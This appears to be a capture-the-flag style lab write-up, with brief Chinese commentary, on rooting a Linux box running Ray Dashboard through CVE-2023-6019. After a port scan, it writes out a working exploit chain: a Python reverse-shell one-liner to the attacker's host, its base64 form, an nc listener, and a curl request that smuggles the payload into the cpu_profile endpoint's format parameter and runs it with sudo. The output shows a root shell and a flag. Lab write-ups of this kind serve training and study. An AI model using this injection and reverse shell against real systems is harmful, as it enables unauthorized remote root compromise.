###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# CVE-2023-6019
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.182.37 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.182.37:22
Open 192.168.182.37:9000
Open 192.168.182.37:35595
Open 192.168.182.37:37395
Open 192.168.182.37:38215
Open 192.168.182.37:33593
Open 192.168.182.37:44217
Open 192.168.182.37:44828
Open 192.168.182.37:35831
Open 192.168.182.37:46479
Open 192.168.182.37:52365
Open 192.168.182.37:44227
Open 192.168.182.37:58192
Open 192.168.182.37:60031

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
9000/tcp  open  http    syn-ack aiohttp 3.9.1 (Python 3.8)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Ray Dashboard
|_http-server-header: Python/3.8 aiohttp/3.9.1
|_http-favicon: Unknown favicon MD5: B01715FDFFE506F5A4DC79170429446C
33593/tcp open  unknown syn-ack
35595/tcp open  unknown syn-ack
35831/tcp open  unknown syn-ack
37395/tcp open  unknown syn-ack
38215/tcp open  unknown syn-ack
44217/tcp open  http    syn-ack WSGIServer 0.2 (Python 3.8.10)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Site doesn't have a title (text/plain; version=0.0.4; charset=utf-8).
|_http-server-header: WSGIServer/0.2 CPython/3.8.10
44227/tcp open  http    syn-ack WSGIServer 0.2 (Python 3.8.10)
|_http-server-header: WSGIServer/0.2 CPython/3.8.10
|_http-title: Site doesn't have a title (text/plain; version=0.0.4; charset=utf-8).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
44828/tcp open  unknown syn-ack
46479/tcp open  unknown syn-ack
52365/tcp open  http    syn-ack aiohttp 3.9.1 (Python 3.8)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: Python/3.8 aiohttp/3.9.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
58192/tcp open  http    syn-ack WSGIServer 0.2 (Python 3.8.10)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: WSGIServer/0.2 CPython/3.8.10
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Site doesn't have a title (text/plain; version=0.0.4; charset=utf-8).
60031/tcp open  unknown syn-ack
8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

搜尋[CVE-2023-6019](https://huntr.com/bounties/d0290f3c-b302-4161-89f2-c13bb28b4cfe)，照著上面
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.240",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# 轉base64
cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNDUuMjQwIiw5MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKSc=

# 開nc
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

┌──(kali㉿kali)-[~/pgplay]
└─$ curl 'http://192.168.182.37:9000/worker/cpu_profile?pid=3354&ip=192.168.182.37&duration=5&native=0&format=`echo%20cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNDUuMjQwIiw5MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKSc=|base64$IFS-d|sudo%20sh`'
```

等反彈得root，在/root得proof.txt
```
# whoami
root

# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@ubuntu:~# cat proof.txt
8ffff0da465d08288ebd853c778b25fa
```